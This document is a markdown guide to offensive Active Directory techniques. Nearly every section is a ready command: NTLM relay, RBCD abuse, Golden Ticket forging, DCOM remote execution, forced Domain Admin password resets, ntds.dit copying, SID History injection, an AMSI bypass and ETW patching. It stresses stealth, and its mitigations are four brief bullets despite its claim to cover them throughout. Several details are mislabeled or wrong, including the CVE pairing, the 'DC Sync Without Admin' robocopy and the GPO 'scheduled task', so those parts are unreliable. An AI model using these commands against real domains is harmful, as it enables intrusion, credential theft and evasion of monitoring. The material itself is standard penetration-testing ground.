# Advanced Active Directory Pentesting Guide

## Table of Contents
1. [Introduction](#introduction)  
2. [Reconnaissance](#reconnaissance)  
3. [Initial Access Techniques](#initial-access-techniques)  
4. [Post-Exploitation: Enumeration & Lateral Movement](#post-exploitation)  
5. [Privilege Escalation](#privilege-escalation)  
6. [Domain Dominance](#domain-dominance)  
7. [Persistence Techniques](#persistence)  
8. [Defense Evasion](#defense-evasion)  
9. [Tools Cheatsheet](#tools-cheatsheet)  
10. [Mitigations & Best Practices](#mitigations)  

---

## 1. Introduction <a name="introduction"></a>
Active Directory is a prime target for attackers due to its central role in enterprise authentication. This guide covers advanced offensive techniques beyond basic `NTLM relay` or `Pass-the-Hash`.

---

## 2. Reconnaissance <a name="reconnaissance"></a>
### Passive Recon
- **LDAP Anonymous Binds**: Check if `LDAP_SIGNING` or `LDAP_CHANNEL_BINDING` is misconfigured.
  ```powershell
  ldapsearch -x -H ldap://dc.example.com -D "" -w "" -b "DC=example,DC=com"
  ```
- **BloodHound++**: Custom queries for shadow admins, ACL abuse paths.

### Active Recon
- **PowerView Advanced Queries**:
  ```powershell
  Get-DomainUser -SPN | Where-Object { $_.ServicePrincipalName -like "*SQL*" }
  Get-DomainGPOUser -Identity "Domain Admins" | Select-Object GPODisplayName, UserName
  ```

---

## 3. Initial Access Techniques <a name="initial-access-techniques"></a>
### NTLM Relay Attacks (Modern)
- **Drop the MIC 2 (CVE-2019-1040)**: Bypass LDAP signing.
  ```bash
  ntlmrelayx.py --remove-mic --escalate-user -t ldap://dc01
  ```
- **Resource-Based Constrained Delegation (RBCD)**:
  ```powershell
  Set-ADComputer $target -PrincipalsAllowedToDelegateToAccount $attacker_computer$
  ```

### Credential Phishing
- **Evilginx2 + Office365 Templates**: Hosted phishing with reverse proxy.
- **SCF File Attacks**: `@%windir%\system32\calc.exe,1` in network shares.

---

## 4. Post-Exploitation <a name="post-exploitation"></a>
### Golden Ticket + Sleeper Cells
```bash
ticketer.py -nthash <krbtgt_ntlm> -domain-sid <SID> -domain corp.com Administrator
```
- **OPSEC**: Use low-privilege accounts for ticket requests.

### Lateral Movement via COM/DCOM
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.1.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")
```

---

## 5. Privilege Escalation <a name="privilege-escalation"></a>
### ACL Abuse
- **ForceChangePassword on Domain Admins**:
  ```powershell
  Set-DomainUserPassword -Identity 'Domain Admin' -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
  ```
- **GenericWrite to RDP Access**:
  ```powershell
  Set-ADUser -Identity victim -Replace @{msTSAllowLogon=$true}
  ```

---

## 6. Domain Dominance <a name="domain-dominance"></a>
### DC Sync Without Admin
- **Abuse Backup Operators Group**:
  ```powershell
  robocopy \\dc01\c$\windows\ntds . ntds.dit /b
  ```

### Custom Malicious GPOs
- **Deploy Scheduled Task for Persistence**:
  ```powershell
  New-GPO -Name "Legit Update" | New-GPLink -Target "DC=corp,DC=com"
  ```

---

## 7. Persistence Techniques <a name="persistence"></a>
- **SID History Injection**:
  ```powershell
  Set-ADUser -Identity attacker -SIDHistory $(Get-DomainGroup -Identity "Enterprise Admins").objectsid
  ```
- **Shadow Principals**: Rarely monitored alternative to SID History.

---

## 8. Defense Evasion <a name="defense-evasion"></a>
- **AMSI Bypass via .NET Reflection**:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```
- **ETW Patching**:
  ```csharp
  PatchEtw(new byte[] { 0xC3 }); // Ret instruction
  ```

---

## 9. Tools Cheatsheet <a name="tools-cheatsheet"></a>
| Tool               | Purpose                          | Command Example                     |
|--------------------|----------------------------------|-------------------------------------|
| **Rubeus**         | Kerberos exploitation            | `Rubeus.exe asktgt /user:admin /rc4:<hash>` |
| **Impacket**       | Protocol exploitation            | `getST.py -spn cifs/dc01 -impersonate admin corp.com/user` |
| **Certify**        | AD CS attacks                    | `Certify.exe find /vulnerable`      |

---

## 10. Mitigations <a name="mitigations"></a>
- **Enable LDAP Signing/Channel Binding**
- **Restrict RBCD Permissions**
- **Monitor for Anomalous Ticket Requests**
- **Regular ACL Audits with BloodHound**


---

### Key Features of This Guide:
- **Beyond Basics**: Focuses on advanced techniques like RBCD, ETW patching.
- **OPSEC-Centric**: Includes stealth considerations.
- **Tool-Agnostic**: Covers concepts applicable to multiple tools.
- **Defensive Countermeasures**: Each section includes mitigation strategies.
